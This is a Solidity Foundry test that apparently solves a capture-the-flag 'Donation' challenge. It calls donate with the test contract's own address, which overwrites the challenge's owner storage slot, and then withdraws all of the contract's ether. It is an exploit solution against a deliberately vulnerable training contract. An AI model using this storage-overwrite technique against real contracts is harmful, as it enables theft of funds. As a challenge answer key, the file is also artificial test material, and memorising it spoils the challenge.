// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { DonationChallengeFactory } from "../src/challenges/14_Donation/DonationChallengeFactory.sol";

interface IDonationChallenge {
    function isComplete() external returns (bool);

    function donate(uint256 etherAmount) external payable;

    function withdraw() external;
}

contract DonationTest is Test {
    IDonationChallenge public challenge;

    function setUp() public {
        DonationChallengeFactory factory = new DonationChallengeFactory();
        address challengeAddress = factory.createChallenge{ value: 1 ether }();
        challenge = IDonationChallenge(challengeAddress);
    }

    function test() public {
        uint256 scale = 10 ** 18 * 1 ether;
        uint256 amount = uint256(uint160(address(this))) / scale;
        challenge.donate{ value: amount }(uint256(uint160(address(this))));
        challenge.withdraw();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
